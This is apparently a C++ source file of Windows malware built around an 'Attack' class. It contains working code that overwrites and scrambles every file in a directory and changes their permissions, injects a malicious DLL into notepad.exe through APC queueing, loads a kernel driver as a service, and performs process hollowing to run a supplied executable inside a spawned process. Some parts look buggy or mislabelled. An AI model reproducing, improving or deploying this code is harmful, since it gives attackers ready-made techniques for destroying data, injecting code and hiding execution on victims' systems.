#include "attack.h"

void Attack::SetFilePermission(LPCWSTR filename)
{
	PSID pEveryoneSID = NULL;
	PACL pACL = NULL;
	EXPLICIT_ACCESS ea[1];
	SID_IDENTIFIER_AUTHORITY SIDAuthWorld = SECURITY_WORLD_SID_AUTHORITY;

	// create a well-known SID for the everyone group
	AllocateAndInitializeSid(&SIDAuthWorld, 1, SECURITY_WORLD_RID,
		0, 0, 0, 0, 0, 0, 0, &pEveryoneSID);

	// initialize an EXPLICIT_ACCESS structure for ACE
	ZeroMemory(&ea, 1 * sizeof(EXPLICIT_ACCESS));
	ea[0].grfAccessPermissions = SPECIFIC_RIGHTS_ALL;
	ea[0].grfAccessMode = GRANT_ACCESS;
	ea[0].grfInheritance = NO_INHERITANCE;
	ea[0].Trustee.TrusteeForm = TRUSTEE_IS_SID;
	ea[0].Trustee.TrusteeType = TRUSTEE_IS_WELL_KNOWN_GROUP;
	ea[0].Trustee.ptstrName = (LPCH)pEveryoneSID;

	// Create a new ACL that contains the new ACEs
	SetEntriesInAcl(1, ea, NULL, &pACL);

	// Initialize a security descriptor
	PSECURITY_DESCRIPTOR pSD = (PSECURITY_DESCRIPTOR)LocalAlloc(LPTR, SECURITY_DESCRIPTOR_MIN_LENGTH);
	InitializeSecurityDescriptor(pSD, SECURITY_DESCRIPTOR_REVISION);

	// Add the ACL to the security descriptor 
	SetSecurityDescriptorDacl(pSD, TRUE, pACL, FALSE); // not a default DACL

													   // Change the security attributes
	SetFileSecurity(filename, DACL_SECURITY_INFORMATION, pSD);

	if (pEveryoneSID)
	{
		FreeSid(pEveryoneSID);
	}
	if (pACL)
	{
		LocalFree(pACL);
	}
	if (pSD)
	{
		LocalFree(pSD);
	}
}

vector<wstring> Attack::list_n_kill_files(wstring path)
{
	vector<wstring> subdirs, matches;
	WIN32_FIND_DATA ffd;
	HANDLE hFind = FindFirstFile((_T(path) + L"\\*.*").c_str(), &ffd);

	if (hFind != INVALID_HANDLE_VALUE)
	{
		do {
			wstring filename = _T(ffd.cFileName);
			if (!(ffd.dwFileAttributes & FILE_ATTRIBUTE_DIRECTORY))
			{
				wstring file_path = path + L"\\" + filename;
				matches.push_back(file_path);

				std::wcout << "Opening contents of " << filename << std::endl;

				// open file for writing
				std::ofstream outfile;
				if (outfile.fail())
				{
					std::wcout << "Can't open file " << filename << "!" << std::endl;
				}
				else {
					string readout;
					string replace;

					std::cout << "Writing to file..." << std::endl;
					// for read
					ifstream file_read(file_path);
					// for write
					outfile.open(file_path, std::ios::in | ::ios::out | std::ios::app);
					while (getline(file_read, readout))
					{
						std::cout << "Replacing line..." << std::endl;
						std::cout << readout << std::endl << std::endl;
						// replace each letter of word in file
						for (int i = 0; i < (int)readout.length() + 1; i++)
						{
							// shift letters up one, power up 3
							replace += readout[i + 1 ^ 3];
						}
						// append replaced strings to file
						outfile << replace + "\n";
						replace.clear();
					}
					// set file permissions to admin if not admin : lock
					SetFilePermission(file_path.c_str());

					// close files
					file_read.close();
					outfile.close();
				}
			}
		} while (FindNextFile(hFind, &ffd) != 0);
		// now attack the file editor! notebook
		std::cout << "\nInjecting all writing processes" << std::endl;
		APCinjection("notepad.exe", (TCHAR *)"..\\..\\dll\\mal_dll\\Release\\mal_dll.dll");
	}
	else {
		std::cout << "Can't find files in directory" << std::endl;
	}
	FindClose(hFind);
	return matches;
}

void Attack::LoadDriverBeep()
{
	SC_HANDLE schSCManager, schService;

	// the driver location, normally we would bring on a malicious one
	// but this is a test one
	LPCTSTR lpszDriverPathName = L"%SystemRoot%\\system32\\drivers\\beep.sys";
	// service display name
	LPCTSTR lpszDisplayName = L"CustomBeep";
	// Registry Subkey
	LPCTSTR lpszServiceName = L"MyCustomBeep";

	// open handle to the SC Manager database
	schSCManager = OpenSCManager(NULL, NULL, SC_MANAGER_ALL_ACCESS); // full access rights

	if (NULL == schSCManager)
	{
		std::cout << "OpenSCManager() failed, error: " << GetLastError() << std::endl;
	}
	else {
		std::cout << "OpenSCManager() loaded OK." << std::endl;
	}

	// Create/install service
	schService = CreateService(
		schSCManager,
		lpszServiceName,
		lpszDisplayName,
		SERVICE_ALL_ACCESS,
		SERVICE_KERNEL_DRIVER, // find types /api/winsvc/nf-winsvc-createservicea
		SERVICE_DEMAND_START,
		SERVICE_ERROR_NORMAL,
		lpszDriverPathName,
		NULL,
		NULL,
		NULL,
		NULL,
		NULL
	);

	if (schService == NULL)
	{
		std::cout << "CreateService() failed, error: " << GetLastError() << std::endl;
	}
	else {
		std::cout << "CreateService() for %S" << lpszServiceName << " loaded OK." << std::endl;
		if (CloseServiceHandle(schService) == 0)
		{
			std::cout << "CloseServiceHandle() failed, error: " << GetLastError() << std::endl;
		} 
		else {
			std::cout << "CloseServiceHandle() is OK." << std::endl;
		}
	}
}

BOOL FindProcess(string exeName, DWORD& pid, vector<DWORD>& tids)
{
	auto hSnapshot = CreateToolhelp32Snapshot(TH32CS_SNAPPROCESS | TH32CS_SNAPTHREAD, 0);
	if (hSnapshot == INVALID_HANDLE_VALUE)
	{
		return FALSE;
	}

	pid = 0;

	PROCESSENTRY32 pe = { sizeof(pe) };
	if (::Process32First(hSnapshot, &pe))
	{
		do
		{
			string str(pe.szExeFile);
			if (pe.szExeFile == exeName)
			{
				pid = pe.th32ProcessID;
				THREADENTRY32 te = { sizeof(te) };
				if (Thread32First(hSnapshot, &te))
				{
					do
					{
						if (te.th32OwnerProcessID == pid)
						{
							tids.push_back(te.th32ThreadID);
						}
					} while (Thread32Next(hSnapshot, &te));
				}
				break;
			}
		} while (Process32Next(hSnapshot, &pe));
	}
	CloseHandle(hSnapshot);
	return pid > 0 && !tids.empty();
}

// Inject a DLL into a target without creating a remote process or thread, actually uses
// virtual memory
BOOL Attack::APCinjection(string target, TCHAR *dll_name)
{
	DWORD exit;
	TCHAR lpdllpath[MAX_PATH];
	GetFullPathName(dll_name, MAX_PATH, lpdllpath, nullptr);

	DWORD pid{};
	vector<DWORD> tids{};

	std::cout << "[ ] Finding matching process name.." << std::endl;
	if (!FindProcess(target, pid, tids))
	{
		std::cout << "[-] Failed to find process of " << target << std::endl;
		return FALSE;
	}

	std::cout << "[+] Found process   " << pid << std::endl;
	std::cout << "[ ] Opening process.." << std::endl;
	auto hProcess = OpenProcess(PROCESS_VM_WRITE | PROCESS_VM_OPERATION, FALSE, pid);
	if (!hProcess)
	{
		std::cout << "[-] Failed to open process." << std::endl;
		return FALSE;
	}
	std::cout << "[+] Opened Process" << std::endl;

	std::cout << "[ ] Allocating memory into process.." << std::endl;
	auto pVa = VirtualAllocEx(hProcess, nullptr, 1 << 12, MEM_COMMIT | MEM_RESERVE, PAGE_READWRITE);
	std::cout << "[+] Allocated memory in remote process" << std::endl;
	std::cout << "[ ] Writing remote process memory.." << std::endl;
	if (!WriteProcessMemory(hProcess, pVa, lpdllpath, sizeof(lpdllpath), nullptr))
	{
		std::cout << "[-] Failed to write remote process memory." << std::endl;
		return FALSE;
	}
	std::cout << "[+] Wrote remote process memory." << std::endl;
	std::cout << "[ ] Enumerating APC threads in remote process.." << std::endl;
	for (const auto &tid : tids)
	{
		auto hThread = OpenThread(THREAD_SET_CONTEXT, FALSE, tid);
		GetExitCodeThread(hThread, &exit);
		if (hThread)
		{
			printf("[*] Found thread at 0x%.8x : %p\r\n", exit, &hThread);
			QueueUserAPC(
				(PAPCFUNC)GetProcAddress(GetModuleHandle(L"kernel32"),
					"LoadLibraryW"),
				hThread,
				(ULONG_PTR)pVa
			);

			CloseHandle(hThread);
		}
	}
	CloseHandle(hProcess);
	return TRUE;
}


// Functions belonging to Process Hallowing attacks
tuple<bool, char*, streampos> OpenBinary(string filename)
{
	auto flag = false; // assume failure
	fstream::pos_type size{};
	char *bin{};

	ifstream ifile(filename, ios::binary | ios::in | ios::ate);
	if (ifile.is_open())
	{
		size = ifile.tellg(); // set size to current filepointer location
		bin = new char[size];
		// Standard get filesize algorithm
		ifile.seekg(0, ios::beg);
		ifile.read(bin, size);
		ifile.close();

		flag = true;
	}

	return make_tuple(flag, bin, size);
}

void PE_FILE::set_sizes(size_t size_ids_, size_t size_dos_stub_, size_t size_inh32_, size_t size_ish_, size_t size_sections_)
{
	this->size_ids = size_ids_;
	this->size_dos_stub = size_dos_stub_;
	this->size_inh32 = size_inh32_;
	this->size_ish = size_ish_ + sizeof(IMAGE_SECTION_HEADER);
	this->size_sections = size_sections_;
}

PE_FILE ParsePE(const char* PE)
{
	PE_FILE pefile{};
	memcpy_s(&pefile.ids, sizeof(IMAGE_DOS_HEADER), PE, sizeof(IMAGE_DOS_HEADER));
	memcpy_s(&pefile.inh32, sizeof(IMAGE_NT_HEADERS64), PE + pefile.ids.e_lfanew, sizeof(IMAGE_NT_HEADERS64)); // address of PE header = e_lfanew
	size_t stub_size = pefile.ids.e_lfanew - 0x3c - 0x4; // 0x3c offet of e_lfanew
	pefile.MS_DOS_STUB = vector<char>(stub_size);
	memcpy_s(pefile.MS_DOS_STUB.data(), stub_size, (PE + 0x3c + 0x4), stub_size);

	auto number_of_sections = pefile.inh32.FileHeader.NumberOfSections;
	pefile.ish = vector<IMAGE_SECTION_HEADER>(number_of_sections + 1); // number of sections

	auto PE_Header = PE + pefile.ids.e_lfanew;
	std::cout << "[+] PE Header: " << PE_Header << std::endl;
	auto First_Section_Header = PE_Header + 0x18 + pefile.inh32.FileHeader.SizeOfOptionalHeader;
	std::cout << "[+] First Section Header: " << First_Section_Header << std::endl;

	for (int i = 0; i < pefile.inh32.FileHeader.NumberOfSections; i++)
	{
		memcpy_s(&pefile.ish[i], sizeof(IMAGE_SECTION_HEADER), First_Section_Header + (i * sizeof(IMAGE_SECTION_HEADER)), sizeof(IMAGE_SECTION_HEADER));
	}

	for (int n = 0; n < pefile.inh32.FileHeader.NumberOfSections; n++)
	{
		shared_ptr<char> t_char(new char[pefile.ish[n].SizeOfRawData]{}, default_delete<char[]>());
		memcpy_s(t_char.get(), pefile.ish[n].SizeOfRawData, PE + pefile.ish[n].PointerToRawData, pefile.ish[n].SizeOfRawData);
		pefile.Sections.push_back(t_char);
		printf("[+] Found Section: 0x%2x\n", t_char);
	}

	size_t sections_size{};
	for (WORD z = 0; z < pefile.inh32.FileHeader.NumberOfSections; z++)
	{
		sections_size += pefile.ish[z].SizeOfRawData;
	}

	pefile.set_sizes(sizeof(pefile.ids), stub_size, sizeof(pefile.inh32), number_of_sections * sizeof(IMAGE_SECTION_HEADER), sections_size);

	return pefile;
}

BOOL ProcessReplacement(string inj_exe)
{
	const wchar_t *target_file = L"..\\..\\test_process_folder\\target-simple-gui.exe";

	std::cout << "[ ] Opening binary to read into buffer" << std::endl;
	tuple<bool, char*, fstream::pos_type> bin = OpenBinary(inj_exe);
	std::cout << "[+] Opened binary" << std::endl;

	if (!get<0>(bin))
	{
		std::cout << "[-] Error opening file" << std::endl;
		return EXIT_FAILURE;
	}

	char *PE_FILE = get<1>(bin); // get pointer to binary as char array
	streamoff size_of_pe = get<2>(bin); // get the filesize from OpenBinary call
	std::cout << "[ ] Parsing PE from buffer" << std::endl;
	auto Parsed_PE = ParsePE(PE_FILE); // get pe_file object
	std::cout << "[+] Got Info from PE" << std::endl;

	auto pStartupInfo = new STARTUPINFO(); // specifies the window station, desktop, standard handles
	auto remoteProcessInfo = new PROCESS_INFORMATION(); // Structure that contains the information about process object

	std::cout << "==============Creating Process to Infect==================" << std::endl;
	std::cout << "[ ] Creating host process" << std::endl;

	CreateProcess(
		target_file,
		nullptr,
		nullptr,
		nullptr,
		FALSE,
		NORMAL_PRIORITY_CLASS,
		nullptr,
		nullptr,
		pStartupInfo,
		remoteProcessInfo
	);

	if (!remoteProcessInfo->hProcess)
	{
		std::cout << "[-] Failed to create remote thread" << std::endl;
		return FALSE;
	}

	if (SuspendThread(remoteProcessInfo->hThread) == -1)
	{
		std::cout << "[-] Failed to stop remote process" << std::endl;
		return FALSE;
	}

	std::cout << "[+] Created host process" << std::endl;
	DWORD dwRetLength;

	std::cout << "============================================" << std::endl;
	
	// Read remote PEB
	PROCESS_BASIC_INFORMATION ProcessBasicInfo;

	std::cout << "===========Hijacking remote Function=============" << std::endl;
	// get NtQueryInformationProcess
	std::cout << "[ ] Loading remote process libraries and functions to build new PEB" << std::endl;
	std::cout << "[ ] getting ntdll" << std::endl;

	auto handleToRemoteNtDll = LoadLibrary(L"ntdll"); // locate NTDLL in new process memory
	if (!handleToRemoteNtDll)
	{
		std::cout << "[-] Failed to get remote handle to NTDLL" << std::endl;
		return FALSE;
	}

	std::cout << "[+] Got handle on NtDll" << std::endl;
	std::cout << "[ ] Getting NtQueryInformationProcess" << std::endl;

	auto fpNtQueryInformationProcess = GetProcAddress(handleToRemoteNtDll, "NtQueryInformationProcess");
	if (!fpNtQueryInformationProcess)
	{
		std::cout << "[-] Failed to locate remote NtQueryProcessInformation function" << std::endl;
		return FALSE;
	}

	std::cout << "[+] Got handle on NtQueryProcessInformation" << std::endl;
	std::cout << "[ ] Executing NtQueryInformationProcess" << std::endl;

	auto remoteNtQueryInformationProcess = reinterpret_cast<_NtQueryInformationProcess>(fpNtQueryInformationProcess);

	// Call remote process NtQueryInfoProc function
	remoteNtQueryInformationProcess(
		remoteProcessInfo->hProcess,
		PROCESSINFOCLASS(0),
		&ProcessBasicInfo,
		sizeof(PROCESS_BASIC_INFORMATION),
		&dwRetLength
	);
	std::cout << "[+] Executed NtQueryInformationProcess" << std::endl;

	auto dwPEBAddr = ProcessBasicInfo.PebBaseAddress; // remote PEB info
	auto pPEB = new PEB(); // create new PEB object

	std::cout << "[ ] Reading process memory to locate remote PEB" << std::endl;
	if (!ReadProcessMemory(remoteProcessInfo->hProcess, 
		static_cast<LPCVOID>(dwPEBAddr), pPEB, sizeof(PEB), nullptr))
	{
		std::cout << "[-] Failed to load remote PEB" << std::endl;
		return FALSE;
	}

	std::cout << "[+] Read foreign PEB" << std::endl;
	std::cout << "[+] Parsed remote PEB" << std::endl;

	// Remote image size calculation
	auto BUFFER_SIZE = sizeof(IMAGE_DOS_HEADER) + sizeof(IMAGE_NT_HEADERS64) + (sizeof(IMAGE_SECTION_HEADER) * 100);
	BYTE *remoteProcessBuffer = new BYTE[BUFFER_SIZE];
	LPCVOID remoteImageAddressBase = pPEB->Reserved3[1]; // set forged process ImageBase to remote process' image base

	std::cout << "[ ] Reading process memory to find process image" << std::endl;
	// read process image from loaded process so we can replace
	if (!ReadProcessMemory(remoteProcessInfo->hProcess,
		remoteImageAddressBase,
		remoteProcessBuffer,
		BUFFER_SIZE,
		nullptr))
	{
		return FALSE;
	}
	std::cout << "[+] Found remote process image" << std::endl;
	// Get handle to unmap remote process sections for replacement
	std::cout << "[ ] Loading remote call to unmap" << std::endl;

	FARPROC fpZwUnmapViewOfSection = GetProcAddress(handleToRemoteNtDll, "ZwUnmapViewOfSection");
	// Create callable version of remote unmap call
	auto ZwUnmapViewOfSection = reinterpret_cast<_ZwUnmapViewOfSection>(fpZwUnmapViewOfSection);

	// Unmap remote process image 
	if (ZwUnmapViewOfSection(remoteProcessInfo->hProcess, const_cast<PVOID>(remoteImageAddressBase)))
	{
		std::cout << "[-] Failed to unmap remote process image" << std::endl;
		return FALSE;
	}
	std::cout << "[+] Unmaped remote process image" << std::endl;

	std::cout << "[!] Hijacking remote image" << std::endl;
	std::cout << "[ ] Allocating memory in foreign process" << std::endl;
	LPVOID hijackerRemoteImage = VirtualAllocEx(remoteProcessInfo->hProcess,
		const_cast<LPVOID>(remoteImageAddressBase),
		Parsed_PE.inh32.OptionalHeader.SizeOfImage,
		MEM_COMMIT | MEM_RESERVE,
		PAGE_EXECUTE_READWRITE);

	if (!hijackerRemoteImage)
	{
		std::cout << "[-] Failed to allocate memory in remote process" << std::endl;
		return FALSE;
	}
	std::cout << "[+] Allocated memory to remote process at 0x" << hijackerRemoteImage << std::endl;
	// Calculate relocation delta
	ULONGLONG dwDelta = ULONGLONG(remoteImageAddressBase) - Parsed_PE.inh32.OptionalHeader.ImageBase;

	// Here we cast the new process to a function pointer that we will cause the remote process to execute
	Parsed_PE.inh32.OptionalHeader.ImageBase = reinterpret_cast<ULONGLONG>(remoteImageAddressBase);

	std::cout << "[ ] Writing hijack image to remote process" << std::endl;
	if (!WriteProcessMemory(remoteProcessInfo->hProcess,
		const_cast<LPVOID>(remoteImageAddressBase),
		PE_FILE,
		Parsed_PE.inh32.OptionalHeader.SizeOfHeaders,
		nullptr))
	{
		std::cout << "[-] Failed to write new headers to remote process memory" << std::endl;
		return FALSE;
	}

	for (WORD i = 0; i < Parsed_PE.inh32.FileHeader.NumberOfSections; i++)
	{
		PVOID VirtAddress = PVOID(reinterpret_cast<ULONGLONG>(remoteImageAddressBase) + Parsed_PE.ish[i].VirtualAddress);

		if (!WriteProcessMemory(remoteProcessInfo->hProcess,
			VirtAddress,
			Parsed_PE.Sections[i].get(),
			Parsed_PE.ish[i].SizeOfRawData,
			nullptr))
		{
			std::cout << "[-] Failed to write one of the new processes" << std::endl;
			return FALSE;
		}
	}

	std::cout << "[+] Wrote process memory" << std::endl;
	std::cout << "============================================" << std::endl;

	auto dwEntryPoint = reinterpret_cast<ULONGLONG>(remoteImageAddressBase) + Parsed_PE.inh32.OptionalHeader.AddressOfEntryPoint;
	std::cout << "==========Hijacking Remote Process=========" << std::endl;
	std::cout << "[ ] Saving debugging context of process" << std::endl;
	LPCONTEXT remoteProcessContext = new CONTEXT(); // debugging structure to hold the old process context
	remoteProcessContext->ContextFlags = CONTEXT_FULL;

	if (!GetThreadContext(remoteProcessInfo->hThread, remoteProcessContext))
	{
		std::cout << "[-] Failed to get debugging context" << std::endl;
		return FALSE;
	}
	std::cout << "[+] Saved process context" << std::endl;

	std::cout << "[*] Modifying proc context ECX->EntryPoint()" << std::endl;
	remoteProcessContext->Ecx = (DWORD)dwEntryPoint; // Set ECX or RCX register to the Entrypoint

	std::cout << "[ ] Restoring modified content at 0x" << remoteProcessContext->Ecx << std::endl;
	if (!SetThreadContext(remoteProcessInfo->hThread, remoteProcessContext) &&
		!GetThreadContext(remoteProcessInfo->hThread, remoteProcessContext))
	{
		std::cout << "[-] Failed to set remote process context && set control thread context" << std::endl;
		return FALSE;
	}
	std::cout << "[+] Restored process context" << std::endl;

	if (!ResumeThread(remoteProcessInfo->hThread))
	{
		std::cout << "[-] Failed to resume remote process" << std::endl;
		return FALSE;
	}

	std::cout << "[!] Process hijacked!" << std::endl;

	CloseHandle(remoteProcessInfo->hProcess);
	return TRUE;
}

BOOL Attack::ProcReplace(string inj_exe)
{
	return ProcessReplacement(inj_exe);
}